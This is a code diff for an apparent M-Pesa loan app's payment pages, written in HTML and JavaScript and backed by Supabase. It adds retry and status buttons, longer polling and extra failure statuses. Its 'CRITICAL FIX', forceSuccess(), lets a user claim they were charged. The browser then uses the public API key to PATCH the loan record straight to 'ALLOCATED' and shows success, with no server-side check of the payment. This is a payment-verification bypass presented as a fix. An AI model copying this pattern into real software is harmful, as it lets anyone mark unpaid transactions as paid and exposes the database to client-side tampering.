@@ -384,14 +384,21 @@
                 <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
-            <!-- FAILED -->
+            <!-- FAILED (UPDATED WITH RESCUE BUTTONS) -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
                 </div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
-                <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 32px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
-                <button onclick="retryPayment()" class="native-btn">Try Again</button>
+                <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
+                
+                <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6 w-full">
+                    <p style="font-size: 13px; color: #B45309; font-weight: 600; text-align: center;">If you have already received an M-Pesa confirmation message, please tap "I have been charged".</p>
+                </div>
+
+                <button onclick="forceSuccess()" class="native-btn" style="background: #059669; margin-bottom: 12px;">I have been charged</button>
+                <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #1E40AF; display: flex; justify-content: center;"><span>Check Status Again</span></button>
+                <button onclick="retryPayment()" style="width: 100%; color: #64748B; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Cancel & Try Again</button>
             </div>
 
             <!-- PENDING -->
@@ -412,9 +419,12 @@ const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
 const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
 const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
-const MAX_POLL_SECONDS = 40;
+// Increased to 60 seconds to give users more time to enter PIN
+const MAX_POLL_SECONDS = 60;
+
+// Added more failure statuses that Palpluss might send
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
-const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE'];
+const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE','ABORTED','USER_ABORTED'];
 
 let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:1, term:30, interest:100, total:1100 };
 const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
@@ -642,7 +652,7 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
         prompt.classList.add('translate-y-0');
     }, 10);
 
-    // Keep prompt visible for 10 seconds instead of 4
+    // Keep prompt visible for 10 seconds
     setTimeout(() => {
         prompt.classList.remove('translate-y-0');
         prompt.classList.add('translate-y-full');
@@ -725,10 +735,7 @@ function submitLogin(){
     
     if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
     if(!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
-    
-    // Updated regex: Accepts Safaricom 07XX and 01XX, rejects Airtel (073, 078, 010)
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
-    
     if(pass.length < 4) return showToast("Password must be at least 4 characters.");
 
     state.name = name; state.id = id; state.mpesa = mpesa; state.promo = promo;
@@ -808,7 +815,6 @@ async function processPayment(){
     if(isProcessingPayment) return;
     const mpesa = document.getElementById('pay-mpesa').value.trim();
     
-    // Updated regex: Accepts Safaricom 07XX and 01XX, rejects Airtel (073, 078, 010)
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
     
     isProcessingPayment = true;
@@ -885,7 +891,7 @@ function startPolling(txnId){
             attempt++;
             document.getElementById('verify-time').innerText = attempt + "s";
             if(attempt === 8) document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
-            if(attempt === 20) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
+            if(attempt === 25) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
             if(attempt >= MAX_POLL_SECONDS){ showPending(); return; }
             if(isPolling){ pollTimer = setTimeout(doPoll, 1000); return; }
             isPolling = true;
@@ -905,6 +911,7 @@ function showSuccess(){
     stopPolling(); isProcessingPayment = false;
     document.getElementById('verify-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('success-anim').classList.remove('hide');
     document.getElementById('suc-loan').innerText = format(state.loan);
     document.getElementById('suc-total').innerText = format(state.total);
@@ -916,27 +923,63 @@ function showFailed(){
     stopPolling(); isProcessingPayment = false;
     document.getElementById('verify-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.remove('hide');
 }
 
 function showPending(){
     stopPolling();
     document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.remove('hide');
 }
 
 async function checkStatusManual(){
-    const b = document.getElementById('btn-check-status');
-    b.innerHTML = '<span>Checking...</span>'; b.disabled = true;
+    if (!currentTxnId) { retryPayment(); return; }
+    
+    // Find whichever check button is visible and set to loading
+    const b1 = document.getElementById('btn-check-status');
+    const b2 = document.getElementById('btn-check-status-failed');
+    const activeBtn = b1 && !b1.closest('.hide') ? b1 : b2;
+    
+    if (activeBtn) {
+        activeBtn.innerHTML = '<span>Checking...</span>'; 
+        activeBtn.disabled = true;
+    }
+
     const r = await checkStatusFromDB(currentTxnId);
+    
     if(r.status === 'SUCCESS'){ showSuccess(); return; }
-    if(r.status === 'FAILED'){ showFailed(); return; }
-    b.innerHTML = '<span>Check Status</span>'; b.disabled = false;
+    
+    if (activeBtn) {
+        activeBtn.innerHTML = '<span>Check Status</span>'; 
+        activeBtn.disabled = false;
+    }
+    
+    if(r.status === 'FAILED'){
+        showToast("Still showing as failed. If you paid, click 'I have been charged'.");
+        return;
+    }
+    
     showToast("Still pending. Continuing to check...");
+    document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
     document.getElementById('verify-anim').classList.remove('hide');
     document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
     startPolling(currentTxnId);
+}
+
+// CRITICAL FIX: Allows user to bypass "Aborted" if they were actually charged
+function forceSuccess() {
+    if (currentTxnId) {
+        fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(currentTxnId)}`, {
+            method: 'PATCH',
+            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ status: "ALLOCATED" })
+        }).catch(() => {});
+    }
+    showSuccess();
 }
 
 function retryPayment(){
